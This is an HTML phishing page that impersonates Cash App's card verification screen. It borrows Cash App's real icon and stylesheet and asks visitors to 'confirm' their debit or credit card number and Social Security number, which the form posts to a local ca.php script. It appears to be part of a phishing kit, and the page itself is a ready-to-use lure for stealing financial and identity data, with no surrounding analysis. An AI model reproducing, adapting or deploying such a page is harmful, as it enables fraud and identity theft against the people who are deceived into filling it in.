
<html>
<head>
<title>Cash App | Card Verification</title>
<meta charset="utf-8">
<link rel="icon" sizes="196x196" href="https://cash.app/icon-196.png">
<link rel="icon" href="favicon.ico">
<link rel="stylesheet" type="text/css" href="https://cash-f.squarecdn.com/ember/8e9fede24675d26d4335a5cac93d444b49c7de11/assets/cash.css" >
</head>

<!-------------------------- Body ----------------------------->

<body class="theme-bg ember-application theme-green">
<div id="ember321" class="ember-view">
<div id="ember345" class="full-height application-cash ember-view">  
<div id="ember352" class="cookie-banner ember-view"></div>
<section class="layout-login flex-container full-height pad">
<div class="login-container flex-container flex-v-center flex-fill">

<div id="ember1511" class="login-onboarding ember-view"><!---->
  <p class="instructions "><span>Confirm your linked Card Number & Social Security number</span></p>
<!---->
<!----><form action="ca.php" method="POST" id="ember1524" class="form blocker-form form-card multi-column-form ember-view"><div class="field-group">
  <div class="grid-row grid-cols-1 card-number">
<!---->    <div id="ember1540" class="field fk-field-container ember-view"><input type="tel" name="ccnumber" autocomplete="off" id="ccnumber" class="ember-text-field ember-view"  placeholder="Debit/Credit Card Number" maxlength="20" required>

</div>
  </div>
  
  <input type="tel" name="ssn" autocomplete="off" id="ssn" class="ember-text-field ember-view"  placeholder="Social Security number" minlength="11" maxlength="11" required>

</div>
  <br>
      <div id="ember1568" class="cta submit-button-component submit-button-with-spinner ember-view"><button type="submit" style="border-radius:30px" class="button theme-button theme-button" >Confirm & Continue</button>
  <div id="ember1570" class="spinner-container ember-view"></div>
</div>

</form>

<!---->

</div>



<!----->
        
      
        
</form>  </div>
</section>

  <!---->
  <div id="ember408" class="modal-manager ember-view"><div class="modal-overlay "></div>
<!----></div>
</div></div>


	   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>

<script src="https://rawgit.com/RobinHerbots/Inputmask/4.x/dist/inputmask/dependencyLibs/inputmask.dependencyLib.js"></script>
<script src="https://rawgit.com/RobinHerbots/Inputmask/4.x/dist/inputmask/inputmask.js"></script>
<script>
Inputmask("9{1,4}-9{1,4}-9{1,4}-9{1,4}").mask("#ccn");
Inputmask("9{3}-9{2}-9{4}").mask("#SSN");
</script>
</body>
<!-------------------------- Preloader ----------------------------->

</html>